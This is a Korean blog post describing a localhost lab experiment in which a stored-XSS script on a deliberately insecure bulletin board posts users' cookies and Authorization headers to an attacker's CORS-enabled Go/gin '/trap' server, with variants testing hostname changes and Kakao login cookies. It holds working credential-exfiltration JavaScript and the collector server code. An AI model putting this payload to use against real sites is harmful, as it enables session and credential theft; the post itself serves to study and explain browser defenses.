---
title: CORS를 이용한 XSS 공격 예시(카카오 로그인)
date: 2021-08-27 18:01:00 +0900
categories: [Web]
tags: [gonic-gin, cors, xss] # TAG names should always be lowercase
---

## 개요
- CORS에 대해 알아가다 보니 이를 이용하여 악의적인 스크립트로  
  사용자 인증 정보를 공격자 서버로 보낼 수도 있겠다(XSS 공격)라는 생각이 들었다.
- 그래서 예시를 작성해 실험해보았다.
- [gonic-gin CORS 처리](https://a3magic3pocket.github.io/posts/cors/)

## XSS(Cross-stie scripting)
- 정의([MDN 문서에서 아래 내용 발췌](https://developer.mozilla.org/ko/docs/Learn/Server-side/First_steps/Website_security#%EC%82%AC%EC%9D%B4%ED%8A%B8_%EA%B0%84_%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%8C%85_(cross-site_scripting_xss)))
  - XSS는 공격자가 클라이언트 측 스크립트를 웹 사이트에 삽입하여  
    다른 사용자의 부라우저에서 수행되게 하는 공격의 유형을 말한다.
  - 삽입된 코드는 웹 사이트에서 피해 사용자의 브라우저로 전송이 됨으로  
    피해 사용자에게 의심받지 않는다.
  - 따라서, 그 삽입된 코드는 피해 사용자의 사이트 권한 쿠키를 공격자에게  
    보내는 종류의 악성 작업을 수행할 수 있다.
  - 그리고 그것을 전달 받은 공격자는 마치 피해 사용자인 것처럼 위장하여 사이트에  
    로그인하고 피해 사용자가 할 수 있는 모든 작업을 수행할 수 있다. 
- XSS의 특징
  - XSS를 완벽히 막는 방법은 없고 매우 막기 힘든 것으로 알고 있다.
  - [XSS 대응방안](http://blog.plura.io/?p=7614)

## 실험개요
- 실험 참여자
  - 보안이 허술한 게시판 서버 A(이하 게시판A)와 악의적인 공격자 서버 B(이하 공격자B)가 있다.
- 게시판A 설명
  - 게시판A는 사용자에게 게시글을 입력 받아 다른 사용자에게 보여주는 게시판이다.
  - 게시판A는 보안이 허술하여 게시글을 보여줄때 어떠한 escape 처리 없이, 게시글을 그대로 렌더한다.  
    예를들어 '\<div>나 게시글이오\</div>'를 사용자가 입력했으면 '나 게시글이오'라고 보여진다.  
- 공격자B 설명  
  - 공격자B는 게시판A에 직접 가입하여 게시판A의 인증방법을 미리 알고 있다.
  - 공격자B는 게시판A의 인증방법에 맞춰 CORS 처리를 해둔 서버 세팅을 해두었다.
  - 공격자B는 게시판A에 인증정보를 전송하는 스크립트 코드로 된 게시글을 게시한다.
  - 이제 게시판A 유저들은 공격자B의 게시글을 보는 순간 스크립트 코드가 실행된다.

## 실험목적
- 공격자B의 공격이 실행되었을때 게시판A의 인증정보가 넘어오는지 확인한다.
- 게시판A의 인증정보는 Cookie와 Authorization 헤더에 담겼다고 가정한다.

## 실험환경
- 예시 소스 코드([참고](https://github.com/a3magic3pocket/xxs-cors-example))
- 상황
  - 게시판A 호스트: localhost:8888
  - 공격자B 호스트: localhost:8889
  - 게시판A에서 공격자B의 글 조회 URL: http://localhost:8888/victim/community
  - 공격자B의 함정 endpoint
      - method: POST
      - endpoint: /trap
- 게시판A에서 공격자B의 글 조회 html
  - ```html
      {% raw %}{{ define "victim-community.html" }}{% endraw %}

      <!DOCTYPE html>
      <html lang="ko">
        <head>
          <meta charset="UTF-8" />
          <meta http-equiv="X-UA-Compatible" content="IE=edge" />
          <meta name="viewport" content="width=device-width, initial-scale=1.0" />
          <title>보안 허술 게시판</title>
        </head>
        <body>
          <div>게시글 본문</div>
          <div>제목: 이 글 보면 좋은 일 생김</div>
          <div>
            내용: 없음
            <script type="text/javascript">
              const baseURL = "http://localhost:8889";
              const testURL = `${baseURL}/trap`;

              function setCookie() {
                // 참고 : https://cofs.tistory.com/363
                var date = new Date();
                date.setTime(date.getTime() + 60 * 60 * 24 * 1000);
                document.cookie = `auth=1; expires=' + ${date.toUTCString()}; path=/`;
              }

              function testPost() {
                setCookie();

                fetch(testURL, {
                  method: "POST",
                  headers: {
                    Authorization: "Bearer auth2",
                  },
                  credentials: "include",
                })
                  .then((response) => response.json())
                  .then((responseJson) =>
                    console.log("Response", JSON.stringify(responseJson))
                  )
                  .catch((error) => console.log("Error", error));
              }

              testPost();
            </script>
          </div>
        </body>
      </html>

      {% raw %}{{ end }}{% endraw %}
      ```
- 공격자B의 라우터
  - ```golang
      package main

      import (
        "fmt"
        "net/http"
        "time"

        "github.com/gin-contrib/cors"
        "github.com/gin-gonic/gin"
      )

      func main() {
        router := gin.Default()

        router.Use(cors.New(
          cors.Config{
            AllowOrigins:     []string{"http://localhost:8888"},
            AllowMethods:     []string{"POST"},
            AllowHeaders:     []string{"Origin", "Cookie", "Authorization"},
            AllowCredentials: true,
            MaxAge:           12 * time.Hour,
          }))

        router.POST("trap", func(c *gin.Context) {
          fmt.Println("Cookie", c.Request.Header["Cookie"])
          fmt.Println("Authorization", c.Request.Header["Authorization"])
          c.JSON(http.StatusOK, gin.H{"code": 0, "msg": "success"})
        })

        router.Run(":8889")
      }
    ```
- 실행방법
    - 게시판A 서버 실행
        - ```bash
            # 새 bash shell을 엶
            cd victim_server
            go run main.go
            ```
    - 공격자B 서버 실행
        - ```bash
            # 새 bash shell을 엶
            cd attacker_server
            go run main.go
            ```
    - 브라우저에서 script의 fetchAPI를 이용하여 공격자B 서버에 POST 요청
        - 브라우저를 켬
        - http://localhost:8888/victim/community 로 접속
        - (접속하면 자동으로 http://localhost:8889/trap 으로 POST 요청됨)
        - 공격자B 서버 bash shell을 관찰하여 endpoint trap에 요청이 들어왔는지 확인  
          그리고 요청에 담긴 Cookie 헤더와 Authorization 헤더 값을 확인

## 실험결과
  - 공격 성공
    - 게시판A 사용자의 Cookie와 Authorization 헤더가 공격자B 서버로 넘어왔다.
    - 게시판A 사용자의 네트워크 처리 상황  
      - <a href="/assets/img/2021-08-25-xss-cors-example/00-request-trap-success.jpg" target="_blank"><img src="/assets/img/2021-08-25-xss-cors-example/00-request-trap-success.jpg" width="100%"></a> 
    - 공격자B 서버 쉘 로그
      - <a href="/assets/img/2021-08-25-xss-cors-example/01-listen-trap-request-success.jpg" target="_blank"><img src="/assets/img/2021-08-25-xss-cors-example/01-listen-trap-request-success.jpg" width="100%"></a> 

## 실험변형 1. 공격자B의 hostname 변경
- 실험의 맹점
  - 사실 이 실험에는 맹점이 있다.
  - 공격자B가 올린 게시글의 악성스크립트를 보면  
    AJAX 요청 목적지인 공격자B의 hostname와  
    AJAX 요청 주체인 게시판A의 hostname이 'localhost'로 동일한 것을 알 수 있다.  
    (공격자B의 endpoint: POST; http://localhost:8889/trap,  
    게시판A의 게시글 url: http://localhost:8888/victim/community)
  - 이 경우 브라우저에서 볼때, 
    게시판A의 서버와 공격자B의 서버가 같다고 인식하게 된다.
  - 따라서 [쿠키의 동일출처정책](https://developer.mozilla.org/ko/docs/Web/Security/Same-origin_policy#%EA%B5%90%EC%B0%A8_%EC%B6%9C%EC%B2%98_%EB%8D%B0%EC%9D%B4%ED%84%B0_%EC%A0%80%EC%9E%A5%EC%86%8C_%EC%A0%91%EA%B7%BC)에 의하여 게시판A에서 할당한 쿠키가 공격자B로 넘어가게 된다.
  - 만약 AJAX 요청 시 공격자B의 hostname을 다르게 설정하면 어떨까?  
    (실제 상황이라면 다를 것이기 때문)
- 실험환경 수정
  - 아래 부분만 수정한 뒤, 이전 실험과 동일한 방법으로 실행한다.
  - 게시판A에서 공격자B의 글 조회 html
    - ```html
        {% raw %}{{ define "victim-community.html" }}{% endraw %}

        <!DOCTYPE html>
        <html lang="ko">
          <head>
            <meta charset="UTF-8" />
            <meta http-equiv="X-UA-Compatible" content="IE=edge" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>보안 허술 게시판</title>
          </head>
          <body>
            <div>게시글 본문</div>
            <div>제목: 이 글 보면 좋은 일 생김</div>
            <div>
              내용: 없음
              <script type="text/javascript">
                // <<< -- 변경 내역 시작 -- <<<
                // const baseURL = "http://localhost:8889";
                const baseURL = "http://127.0.0.1:8889";
                // >>> -- 변경 내역 끝 -- >>>
                const testURL = `${baseURL}/trap`;

                function setCookie() {
                  // 참고 : https://cofs.tistory.com/363
                  var date = new Date();
                  date.setTime(date.getTime() + 60 * 60 * 24 * 1000);
                  document.cookie = `auth=1; expires=' + ${date.toUTCString()}; path=/`;
                }

                function testPost() {
                  setCookie();

                  fetch(testURL, {
                    method: "POST",
                    headers: {
                      Authorization: "Bearer auth2",
                    },
                    credentials: "include",
                  })
                    .then((response) => response.json())
                    .then((responseJson) =>
                      console.log("Response", JSON.stringify(responseJson))
                    )
                    .catch((error) => console.log("Error", error));
                }

                testPost();
              </script>
            </div>
          </body>
        </html>

        {% raw %}{{ end }}{% endraw %}
        ```

## 공격자B의 hostname 변경 실험 결과
- 공격 일부 실패
  - Authorization 헤더는 받아왔지만, Cookie를 받는데에는 실패했다.
  - 공격자B 서버 쉘 로그
    - <a href="/assets/img/2021-08-25-xss-cors-example/03-listen-trap-request-hostname-changed.jpg" target="_blank"><img src="/assets/img/2021-08-25-xss-cors-example/03-listen-trap-request-hostname-changed.jpg" width="100%"></a> 

## 실험변형 2. 카카오 소셜로그인 서비스 공격
- 의문
  - 카카오 소셜로그인은 RestAPI 방식과 javascript 팝업 방식(이하 팝업 방식)으로 제공된다.
  - 팝업 방식을 사용하면 카카오 인증정보가 쿠키로 저장된다.
  - <a href="/assets/img/2021-08-25-xss-cors-example/04-kakao-auth-cookie.jpg" target="_blank"><img src="/assets/img/2021-08-25-xss-cors-example/04-kakao-auth-cookie.jpg" width="100%"></a>  
    위에서 보이는 쿠키들을 그대로 복사한 뒤, 카카오 인증을 하지 않은 다른 브라우저에 입력하고  
    카카오 서비스에 접속해보면 로그인이 된다.
  - 과연 이전 실험과 같은 방법으로 카카오 인증정보를 가져올 수 있을까?
- 실험변형 개요
  - 게시글A에서 실험용 페이지 victim-community-kakao.html를 만든다.
  - victim-community-kakao.html에 카카오 로그인과 공격자B 서버로  
    AJAX 요청을 하는 '공격 버튼'을 만든다.
  - 사용자가 http://localhost:8888/victim/community/kakao 에 접속하여  
    카카오 로그인을 한 후 '공격 버튼'을 클릭한다.
  - 공격자B 서버 bash shell을 관찰하여 endpoint trap에 요청이 들어왔는지 확인한다.  
    그리고 요청에 담긴 Cookie 헤더와 Authorization 헤더 값을 확인한다.
- 주의사항
  - 팝업 방식으로 카카오 로그인 구현 시 카카오앱의 javascript key가 필요하다.
  - [카카오 개발자](https://developers.kakao.com/docs/latest/ko/kakaologin/js)로 이동하여 실험용 카카오앱을 만들고 javascript key를 발급받자.
- 실험환경 수정
  - 게시판A 서버에서 victim-community-kakao.html를 만들고 라우터를 생성한다.  
    (endpoint GET; victim/community/kakao로 라우터에 추가([참고](https://github.com/a3magic3pocket/xxs-cors-example/blob/main/victim_server/main.go)))
  - 나머지 부분은 이전 실험과 동일하다
  - 실행방법은 실험변경 개요에서 서술한 것과 같이 진행한다.
  - victim-community-kakao.html
    - ```html
      {% raw %}{{ define "victim-community-kakao.html" }}{% endraw %}

      <!DOCTYPE html>
      <html lang="ko">
        <head>
          <meta charset="UTF-8" />
          <meta content="yes" name="apple-mobile-web-app-capable" />
          <meta
            content="minimum-scale=1.0, width=device-width, maximum-scale=1, user-scalable=no"
            name="viewport"
          />
          <script src="https://developers.kakao.com/sdk/js/kakao.js"></script>
        </head>

        <body>
          <div>로그인 상태: <span id="login-status">로그인 안 함</span></div>
          <a id="login">카카오 로그인</a>

          <div>
            <div style="display: block; margin-top: 100px">게시판 낚시 글</div>
            <button
              onclick="(function() {
              var xhr = new XMLHttpRequest();
              var url = 'http://127.0.0.1:8889/trap';

              xhr.open('POST', url, true);
              xhr.withCredentials = true
              xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                  var status = xhr.status;
                  if (status === 0 || (status >= 200 && status < 400)) {
                    console.log('You are in my trap', xhr.responseText)
                  } else {
                    console.log('I failed to get you into my trap.', xhr.responseText)
                  }
                }
              } 
              xhr.send()
            })()"
            >
              ☆★☆★누르면 놀라운 일이 벌어짐☆★☆★
            </button>
          </div>

          <script type="text/javascript">
            var loginStatusElem;

            document.addEventListener("DOMContentLoaded", function () {
              loginStatusElem = document.querySelector("#login-status");

              // 본인 소유의 카카오 javascript key 입력
              Kakao.init("your-kakao-app-javascript-key");
              Kakao.isInitialized();
              console.log(Kakao.isInitialized());

              Kakao.Auth.createLoginButton({
                container: "#login",
                success: function (response) {
                  console.log("success", response);
                  loginStatusElem.innerHTML = "로그인 중";
                },
                fail: function (error) {
                  console.log("login is failed", error);
                  loginStatusElem.innerHTML = "로그인 실패";
                },
              });
            });
          </script>
        </body>
      </html>

      {% raw %}{{ end }}{% endraw %}
      ```
      
## 카카오 소셜로그인 서비스 공격 실험결과
- 실패
  - 공격자B로 쿠키에 담긴 카카오 계정정보가 전송되지 않았다.
  - <a href="/assets/img/2021-08-25-xss-cors-example/05-listen-trap-kakako-auth.jpg" target="_blank"><img src="/assets/img/2021-08-25-xss-cors-example/05-listen-trap-kakako-auth.jpg" width="100%"></a>  
- 이유
  - 카카오 인증정보 쿠키를 보면 domain이 localhost가 아니다.  
  - <a href="/assets/img/2021-08-25-xss-cors-example/06-check-kakao-auth-cookie-domain.jpg" target="_blank"><img src="/assets/img/2021-08-25-xss-cors-example/06-check-kakao-auth-cookie-domain.jpg" width="100%"></a>  
  - [쿠키의 동일출처정책](https://developer.mozilla.org/ko/docs/Web/Security/Same-origin_policy#%EA%B5%90%EC%B0%A8_%EC%B6%9C%EC%B2%98_%EB%8D%B0%EC%9D%B4%ED%84%B0_%EC%A0%80%EC%9E%A5%EC%86%8C_%EC%A0%91%EA%B7%BC)에 의해 브라우저는  
    공격자B의 서버와 카카오 인증정보 쿠키를 할당한 서버가 다르다고 판명하고  
    공격자B로의 AJAX 요청에 카카오 인증정보를 보내지 않은 것이다.

## 결론
- 대부분의 웹 프레임워크는 기본적으로 escaping script를 하고 렌더한다.
  - 이 실험은 XSS가 성공했다고 가정하고 한 실험이다.
  - 일반적으로 웹 프레임워크는 사용자에게 받은 데이터를 DB에 저장하고  
    이를 꺼내 뷰로 뿌리면 innerText로 지정되어 해당 내용이 그대로 렌더되지 않는다.
  - 예를들면, [Label 태그에 개행(newLine) 넣기](https://a3magic3pocket.github.io/posts/apply-innerHTML-in-label-tag/) 과 같이  
    gotemplate 역시 escaping 처리되어 나오는 것을 알 수 있다.
  - 하지만 DOM-based 방식 외의 다른 방법으로 XSS를 시도한다면 이 방법으로 막을 수 없다.
- Authorization Header보다 Cookie가 안전할지도?
  - 위 실험결과만 보면 HttpOnly 설정과 Secure 설정등의 옵션이 체크된 Cookie가  
    Authorization Header보다 안전할 수도 있다고 생각이 들었다.
  - 만약 게시판A에서 기본인증을 사용하여 Authorization Header로 인증을 구현하고 있었다면,  
    위 실험과 같은 방법으로 공격자B는 base64 문자열을 decode 하여  
    사용자의 ID, password를 확보할 수 있을 것이다.

## 참고
- [쿠키의 동일출처정책](https://developer.mozilla.org/ko/docs/Web/Security/Same-origin_policy#%EA%B5%90%EC%B0%A8_%EC%B6%9C%EC%B2%98_%EB%8D%B0%EC%9D%B4%ED%84%B0_%EC%A0%80%EC%9E%A5%EC%86%8C_%EC%A0%91%EA%B7%BC)
- [카카오 개발자, 자바스크립트와 카카오 로그인](https://developers.kakao.com/docs/latest/ko/kakaologin/js)

